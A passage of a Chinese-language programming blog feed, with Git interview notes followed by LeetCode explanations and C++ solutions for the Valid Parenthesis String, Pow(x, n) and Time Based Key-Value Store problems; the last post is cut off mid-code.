#僅移動HEAD</span><br><span class="line">git reset --mixed &lt;commit-hash&gt;</span><br><span class="line">git reset --hard &lt;commit-hash&gt;</span><br></pre></td></tr></table></figure><h1 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h1><blockquote><p><em><strong>什麼情況下你會使用 <code>git rebase</code>?</strong></em></p></blockquote><p>當今天個團隊正在一個 feature branch 上開發新功能，這個 feature branch 是從 main branch 長出來的。當 feature 的開發完成了，團隊希望將功能 merge 到 main branch 並且不希望保留 feature branch上的任何commit 則可以使用 git rebase。</p><p>(但其實有更好的做法就是用 <code>git merge --squash</code>，先將 feature branch 上的所有提交壓縮成一個commit)</p><blockquote><p><em><strong>要如何將一個特定檔案反轉成先前的commit?</strong></em></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout HEAD~1 -- /path/to/the/file</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git restore --source-&lt;commit-hash&gt; -- &lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>git restore</code> 是較新的指令，功能與 checkout 類似，這樣會把檔案恢復到指定的提交內容</p><blockquote><p><em><strong>要如何 squash 最後兩個 commit?</strong></em></p></blockquote><p>若這兩個 commit 還沒push，則可以 revert回前兩個commit然後再一次提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --soft HEAD~2</span><br><span class="line">git commit -m &quot;new combined commit message&quot;</span><br></pre></td></tr></table></figure><p>但如果這兩個 commit 已經 push到 repo了，那就要用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git rebase -i HEAD~2</span><br></pre></td></tr></table></figure><p>這會打開編輯器，會顯示提交歷史，可能會像是下面這樣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pick &lt;commit-hash-1&gt; Commit message for the second-to-last commit</span><br><span class="line">pick &lt;commit-hash-2&gt; Commit message for the last commit</span><br></pre></td></tr></table></figure><p>只要將第二行的pick變更為 <code>squash</code>，這就代表將最後一個提交壓縮到倒數第二個提交中 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pick &lt;commit-hash-1&gt; Commit message for the second-to-last commit</span><br><span class="line">squash &lt;commit-hash-2&gt; Commit message for the last commit</span><br></pre></td></tr></table></figure><p>保存退出後，並且修改新的commit訊息，就可以看見兩個commit合併成同一個了</p><blockquote><p><em><strong>如何刪除一個 remote branch?</strong></em></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push orgin --delete &lt;branch&gt;</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>刪除遠端分支後，其他協作成員將無法再從遠端倉庫中拉取該分支!</p></div><blockquote><p><em><strong>什麼是 gitattributes ?</strong></em></p></blockquote><p><code>.gitattributes</code> 是Git 中的一種設定檔， <strong>用於設定檔案的屬性和處理方式</strong>，可以讓使用這在 Git 操作過程中 (Ex. merge, commit) 時對檔案進行處理</p><p>主要用途像是</p><ul><li>管理檔案的行尾(Line Ending): 這也是最常見的用途之一，通常不同OS下對於檔案中的每一行結尾會使用不同的結尾符號 (Windows: CRLF, Linux: LF )，而這也可能導致不必要的變更衝突，可以透過設定 <code>.gitattributes</code> 來統一行尾符號的處理方式。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* text=auto</span><br></pre></td></tr></table></figure><p>上面命令可以讓Git 自動根據系統來設定行尾符號，並在 commit 時將行尾符號轉換成 LF(Unix&#x2F;Linux)</p><blockquote><p><em><strong>在 Commit 前要如何刪除local changes</strong></em></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>那又要如何刪除local commit?</strong></em></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD~1</span><br></pre></td></tr></table></figure><p>這樣可以移除最近一次的 local commit，如果也需要移除local change 可以加上 <code>--hard</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD~1</span><br></pre></td></tr></table></figure><h1 id="Git-Diff"><a href="#Git-Diff" class="headerlink" title="Git Diff"></a>Git Diff</h1><blockquote><p><em><strong>git diff 會做什麼事情?</strong></em></p></blockquote><p>會去查看工作目錄和staging area之間的變更，會顯示所有已修改但未被加入 staging area 的檔案變更。</p><p>若想看 staging area 以及最新commit 之間得變更，則是使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff --cached</span><br></pre></td></tr></table></figure><p>若想看工作目錄以及最新commit之間的變更</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD</span><br></pre></td></tr></table></figure><p>另外也可以查看任意檔案，兩commits，兩branch 之間的差異</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git diff &lt;commit1&gt; &lt;commit2&gt;</span><br><span class="line">git diff &lt;filename&gt;</span><br><span class="line">git diff &lt;branch1&gt; &lt;branch2&gt;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>哪個命令比較快?<code>git diff-index HEAD</code>以及 <code>git diff HEAD</code></strong></em></p></blockquote><p><code>git diff-index HEAD</code> &gt; <code>git diff HEAD</code></p><p><code>git diff-index HEAD</code> 是直接比較索引(staging area) 與特定commit (<code>HEAD</code>) 之間的差異，因此不需要掃描整個工作目錄的檔案，所以速度較快</p><p>然而 <code>git diff HEAD</code> 則是比較整個工作目錄和特定commit 之間的差異，因此會去掃描整個工作目錄並且計算文件的差異，一旦檔案量大時，速度會變慢。</p><h1 id="Git-Internal"><a href="#Git-Internal" class="headerlink" title="Git Internal"></a>Git Internal</h1><blockquote><p><em><strong>解釋一下 <code>git status</code> 的運作原理</strong></em></p></blockquote><p><code>git status</code> 會去進行一系列檢查和比較，</p><ol><li>首先會檢查工作目錄跟Staging Area之間的差異，看哪些檔案有修改但未被staged</li></ol><p>git 會為每個檔案計算 SHA-1 Hash，查看該hash是否存在於 staging area，如果紀錄不匹配則被視為沒被加入staging area</p><ol start="2"><li>接著會比較 staging area 跟最新的commit（HEAD）的狀態，來確定哪些檔案已經被加入 staging area 但尚未commit</li></ol><p>git 會檢查staging area中的hash 和 HEAD 中提交的 hash值是否一樣</p><ol start="3"><li>檢查未追蹤檔案</li></ol><p>git 會為掃描工作目錄中所有未在staging area 中的檔案，標記成untracked files，但同時 git 也會去檢查 <code>.gitignore</code> 的設定，過濾掉那些不應該track的檔案</p><ol start="4"><li>更新工作狀態</li></ol><p>Git 對大型儲存庫執行 <code>git status</code> 時，<strong>會使用增量掃描和快取來加快速度</strong></p><ul><li>Git 有時會啟用 <code>core.untrackedCache</code> 來記錄未追蹤檔案的狀態，以避免每次都重新掃描</li><li>若啟用了 <code>core.preloadIndex</code>，Git 會預加載索引，減少磁碟 I&#x2F;O 操作，從而提高檢查文件狀態的速度</li></ul><p>這兩個設定都可以透過 <code>git config</code> 來去啟用</p><blockquote><p>Ref: <a href="https://deepinout.com/git/git-questions/218_git_why_is_git_corepreloadindex_default_value_false.html">https://deepinout.com/git/git-questions/218_git_why_is_git_corepreloadindex_default_value_false.html</a></p></blockquote><ol start="5"><li>輸出結果</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合法括號字串 | Medium | LeetCode#678. Valid Parenthesis String</title>
      <link href="/posts/85addf17.html"/>
      <url>/posts/85addf17.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/678/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個字串 <code>s</code> 包含三種可能的字元: <code>(</code>, <code>)</code> 以及 <code>*</code>，若 <code>s</code> 為Valid 請回傳 <code>true</code> 否則為 <code>false</code></li></ul><p>下面是判斷 <code>s</code> 是否合法的規則:</p><ul><li>任何 <code>(</code> 都需要有對應的 <code>)</code> 才能閉合</li><li>任何 <code>)</code> 都需要有對應的 <code>(</code> 才能閉合</li><li><code>(</code> 需要出現在 <code>)</code> 之前才可閉合</li><li><code>*</code> 可以代表 <code>(</code>. <code>)</code> 或者是空字串 <code>&quot;&quot;</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這題跟單純的括號閉合題型不太一樣的是，多了一個變因 <code>*</code> ，它可能是左括號也可能是右括號，因此我們會需要追蹤這種可能性</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkValidString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> leftMin = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftMax = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">1</span> &amp;&amp; s[<span class="number">0</span>]!=<span class="string">&#x27;*&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                leftMin++;</span><br><span class="line">                leftMax++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                leftMin--;</span><br><span class="line">                leftMax--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                leftMax++;</span><br><span class="line">                leftMin--;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(leftMax &lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(leftMin &lt; <span class="number">0</span>) leftMin = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftMin ==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡需要兩個變數 <code>leftMin</code> 以及　<code>leftMax</code> 來 <strong>追蹤還有剩餘多少左括號需要被匹配</strong>，因為有 <code>*</code> 這個變因，因此才需要兩個變數分別追蹤最多可能有多少左括號要被匹配跟最少可能有多少左括號要被匹配。</p><p>可以迭代 <code>s</code> 然後每次檢查是否是左括號 <code>(</code> 如果是的話那 <code>leftMin</code> 跟 <code>leftMax</code> 同時增加，如果是 <code>)</code> 則 <code>leftMin</code> 跟 <code>leftMax</code> 同時減少，這代表可以確定有一組括號閉合了，因此剩餘需要匹配的左括號數量會減少。當字元等於 <code>*</code> 則代表他可能會是左括號或右括號，如果為左括號，那剩餘需要匹配的括號數量就會增加，因此 <code>leftMax</code> 增加一，而如果為右括號，則代表剩餘需要匹配的括號數量減少，因此最少需要匹配左括號的數量會變少，而最多需要匹配左括號的數量增加，因此 <code>leftMin--</code> 而 <code>leftMax++</code>。</p><p>然而只要迭代過程中發現最多需要匹配左括號的數量小於0，則代表沒有剩餘的左括號或者 <code>*</code> 了，因此會是 invalid 直接回傳 <code>false</code> 而字串 <code>s</code> 迭代完畢後如果最少需要匹配的左括號為 <code>0</code> 的話就代表字串是合法的，因為所有左括號都閉合了。否則就是非法的</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/678/result.png"></p><h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>時間複雜度: $O(n)$<br>空間複雜度: $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Greedy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pow(x, n) | Medium | LeetCode#50. Pow(x, n)</title>
      <link href="/posts/8a835d3b.html"/>
      <url>/posts/8a835d3b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/50/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：題目要求實現常見的 <code>pow</code> 函數，正常來說 <code>pow(x, n)</code> 就會回傳 <code>x</code> 的 <code>n</code> 次方的結果。</li></ul><div class="note info flat"><p>而題目有給下面限制:</p><ul><li><code>-100.0 &lt; x &lt; 100.0</code></li><li><code>-231 &lt;= n &lt;= 231-1</code></li><li><code>n is an integer.</code></li><li><code>Either x is not zero or n &gt; 0.</code></li><li><code>-104 &lt;= x^n &lt;= 104</code></li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>原先的方法會 TLE，原先這種逐項去乘會有溢位風險，如果次方給很大，Ex. <code>x = 2.0, n = -2147483648</code> &#x3D;&gt; 保證TLE</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> ans;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n ==<span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n &gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="type">double</span> num = x;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">double</span> i=<span class="number">1</span>; i&lt;n; i++)&#123;</span><br><span class="line">                num = num* x ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">double</span> num = x; </span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>/x;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">double</span> i=<span class="number">1</span>; i&lt; <span class="built_in">abs</span>((<span class="type">double</span>)n); i++)&#123;</span><br><span class="line">                num = num * x;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="number">1</span>/num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="快速冪次法"><a href="#快速冪次法" class="headerlink" title="快速冪次法"></a>快速冪次法</h2><p>另一種做法叫做 **快速冪次法(Exponentiation by Squaring)**，這是一種用於快速計算大整數乘冪的演算法，並且時間複雜度會是 $O(log n)$，其原理如下：</p><ul><li>二進位分解: 將指數 <code>n</code> 轉換為二進位表示，Ex. $a^13$ 則 <code>13</code> 的二進位會是 <code>1101</code></li><li>平方跟累乘: <ul><li>從底數 <code>a</code> 開始，依序計算 $a^1$,$a^2$,$a^4$,$a^8$, …. (不斷平方)</li><li>將指數的二進位表示中為 <code>1</code> 的位元所對應的次方數相乘，舉例來說 $a^13$ (二進位 <code>1101</code>)，表示 <code>13=8+4+1</code>。 因此需要將 $a^{8},a^{4},a^{1}$ 相乘，即 $a^{13}&#x3D;a^{8}\times a^{4}\times a^{1}$</li></ul></li></ul><p>快速冪次過程只需進行約 $log _{2}n$ 次的平方和乘法，而不是傳統的 $n-1$ 次乘法。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// use exponentiation by squaring</span></span><br><span class="line">    <span class="comment">// Example: x^13 = x^(8+4+1) = x^8 + x^4 + x^1 ( = x^(1011) binary) </span></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> e = n;</span><br><span class="line">        <span class="keyword">if</span>(e&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            x = <span class="number">1.0</span> / x;</span><br><span class="line">            e = -e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> ans = <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">while</span>(e&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// check if the LSB equal to 1, if its 1 then multiply it</span></span><br><span class="line">            <span class="keyword">if</span>(e &amp; <span class="number">1LL</span>) ans *= x;</span><br><span class="line">            x *= x;</span><br><span class="line">            e = e&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>myPow</code> 中前半段先宣告一個 long long 型別的變數 <code>e</code> 用於存放指數 <code>n</code>。接著需要對負指數進行處理，如果指數為負，那 <code>myPow</code> 後的結果要是分數，因此 <code>x = 1.0/ x</code> 並且可以把負數搬回正數 <code>e = -e</code>。 揭著進行累乘，主要透過一個while迴圈，只要 <code>e</code> 還大於0就繼續計算：</p><ol><li>判斷做右邊那位元是否為 <code>1</code>:  <code>if(e &amp; 1LL) ams *= x;</code></li><li>接下來，每一輪底數平方</li><li><code>e</code> 右移一位（丟掉處理完的那一位）</li></ol><blockquote><p>這邊的原理是：<br><code>x^13 = x^(8 + 4 + 1) = x^8 * x^4 * x^1</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 位元          | 意義  | 要不要乘這個次方的 x |</span><br><span class="line">| ----------- | --- | ----------- |</span><br><span class="line">| 最右邊 bit (1) | x^1 | ✅ 要乘        |</span><br><span class="line">| 下一個 bit (0) | x^2 | ❌ 不乘        |</span><br><span class="line">| 下一個 bit (1) | x^4 | ✅ 要乘        |</span><br><span class="line">| 下一個 bit (1) | x^8 | ✅ 要乘        |</span><br></pre></td></tr></table></figure><blockquote><p>另外因為 <code>e</code> 的型別是 long long，所以判斷最右邊位元是否為 1 的方式就是乘上 <code>1LL</code> &#x3D;&gt; 就代表跟 64 bit 長的 1 (<code>0000000....0001</code>) 去進行 &amp; operation，如果最右邊位元是 <code>1</code> 才會為 true</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/50/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(log n)$<br>空間複雜度<br>$O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Math </tag>
            
            <tag> Exponentiation by Squaring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基於時間的鍵值對儲存 | Medium | LeetCode#981. Time Based Key-Value Store</title>
      <link href="/posts/5d887d47.html"/>
      <url>/posts/5d887d47.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/981/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目要求設計一個 time-based 的 key-value 儲存結構，可以相同key可以儲存多種值並且對於相同Key可以有多個不同的timestamp，並且用戶可以透過特定 timestamp 獲取值</li></ul><div class="note info flat"><p>請實踐一個 <code>TimeMap</code> class:</p><ul><li><code>TimeMap()</code> 用於初始化物件</li><li><code>void set(String key, String value, int timestamp)</code>: 在給定 <code>timestamp</code> 條件下， 儲存 <code>value</code> 到對應到特定的 <code>key</code> 上</li><li><code>String get(String key, int timestamp)</code>: 回傳先前透過 <code>set</code> 函數儲存的值，並且請找出小於等於當前 <code>timestamp</code> 的timestamp。如果有多個值，請回傳具有最大但小於 <code>timestamp</code> 的 timestamp 值。若沒有值，則回傳 <code>&quot;&quot;</code></li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TimeMap</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#123;&#123;key, timestamp&#125;,value&#125;</span></span><br><span class="line">    unordered_map&lt;string, vector&lt;pair&lt;string, <span class="type">int</span>&gt;&gt;&gt; umap;</span><br><span class="line">    <span class="built_in">TimeMap</span>() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">set</span><span class="params">(string key, string value, <span class="type">int</span> timestamp)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Since it&#x27; push back, the timestamp is strictly increasing</span></span><br><span class="line">        umap[key].<span class="built_in">push_back</span>(&#123;value, timestamp&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">get</span><span class="params">(string key, <span class="type">int</span> timestamp)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// find item</span></span><br><span class="line">        <span class="keyword">if</span>(umap.<span class="built_in">find</span>(key)!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">            <span class="comment">// find timestamp &lt;= given timestamp</span></span><br><span class="line">            <span class="comment">// binary search</span></span><br><span class="line">            <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> right = umap[key].<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            string returnString=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">                <span class="type">int</span> mid = left + (right - left) /<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(umap[key][mid].second &gt; timestamp)&#123;</span><br><span class="line">                    right = mid<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (umap[key][mid].second &lt;= timestamp)&#123;</span><br><span class="line">                    returnString = umap[key][mid].first;</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> returnString;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your TimeMap object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * TimeMap* obj = new TimeMap();</span></span><br><span class="line"><span class="comment"> * obj-&gt;set(key,value,timestamp);</span></span><br><span class="line"><span class="comment"> * string param_2 = obj-&gt;get(key,timestamp);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>我的想法也蠻簡單的，其實就是要先有個結構能夠同時有key跟value 跟不同的 timestamp，直覺想到使用 Hash Table 只是可能要變化一下，首先宣告成員變數 <code>umap</code> 這邊希望儲存結構會是長成 <code> &#123;key, &#123;value, timestamp&#125;&#125;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;string, vector&lt;pair&lt;string, <span class="type">int</span>&gt;&gt;&gt; umap</span><br></pre></td></tr></table></figure><p>在 <code>set</code> 函數就比較直覺，直接把input 中的 <code>value</code>, <code>timestamp</code> 包成pair 放入 <code>umap[key]</code> 這邊由於是 <code>push_back</code> 且題目呼叫的 timestamp 會是由小到大呼叫，因此在 <code>umap[key]</code> 當中的pair中的timestamp 會是嚴格由小到大排序。</p><p>再來是 <code>get</code> 函數，這邊如果在 <code>umap</code> 中找不到 key 就會直接回傳 <code>&quot;&quot;</code>。如果有找到，由於已經排序好了，因此目標要找小於當前的 <code>timestamp</code> 值中最大的那個，因此 <strong>已排序陣列找特定元素，要用 Binary Search</strong>， 這邊宣告兩個變數 <code>left</code> 和 <code>right</code>來執行二元搜尋。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 